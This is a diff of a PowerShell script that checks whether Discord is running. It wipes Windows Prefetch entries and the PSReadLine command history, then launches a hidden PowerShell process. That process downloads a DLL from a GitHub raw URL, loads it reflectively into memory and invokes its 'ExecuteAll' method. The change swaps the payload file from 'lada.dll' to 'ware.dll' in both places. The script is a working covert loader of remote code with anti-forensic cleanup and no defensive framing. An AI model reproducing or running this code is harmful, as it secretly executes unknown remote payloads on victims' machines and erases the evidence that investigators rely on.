@@ -25,7 +25,7 @@ if (-not (Get-Process Discord -ErrorAction SilentlyContinue)) {
     Remove-Item -Path "C:\Windows\Prefetch\RUNONCE*" -Force -ErrorAction SilentlyContinue
     Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
     Clear-History -ErrorAction SilentlyContinue
-    Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"$b = (New-Object System.Net.WebClient).DownloadData('https://github.com/zold1337/toolsvip/raw/refs/heads/main/lada.dll'); $a = [System.Reflection.Assembly]::Load($b); $a.GetType('ServiceManagerApp.MainTool').GetMethod('ExecuteAll').Invoke($null, $null)`""
+    Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"$b = (New-Object System.Net.WebClient).DownloadData('https://github.com/zold1337/toolsvip/raw/refs/heads/main/ware.dll'); $a = [System.Reflection.Assembly]::Load($b); $a.GetType('ServiceManagerApp.MainTool').GetMethod('ExecuteAll').Invoke($null, $null)`""
     Exit
 }
 
@@ -112,5 +112,5 @@ Remove-Item -Path "C:\Windows\Prefetch\POWERSHELL*" -Force -ErrorAction Silently
 Remove-Item -Path "C:\Windows\Prefetch\RUNONCE*" -Force -ErrorAction SilentlyContinue
 Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 Clear-History -ErrorAction SilentlyContinue
-Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"$b = (New-Object System.Net.WebClient).DownloadData('https://github.com/zold1337/toolsvip/raw/refs/heads/main/lada.dll'); $a = [System.Reflection.Assembly]::Load($b); $a.GetType('ServiceManagerApp.MainTool').GetMethod('ExecuteAll').Invoke($null, $null)`""
+Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"$b = (New-Object System.Net.WebClient).DownloadData('https://github.com/zold1337/toolsvip/raw/refs/heads/main/ware.dll'); $a = [System.Reflection.Assembly]::Load($b); $a.GetType('ServiceManagerApp.MainTool').GetMethod('ExecuteAll').Invoke($null, $null)`""
 Exit
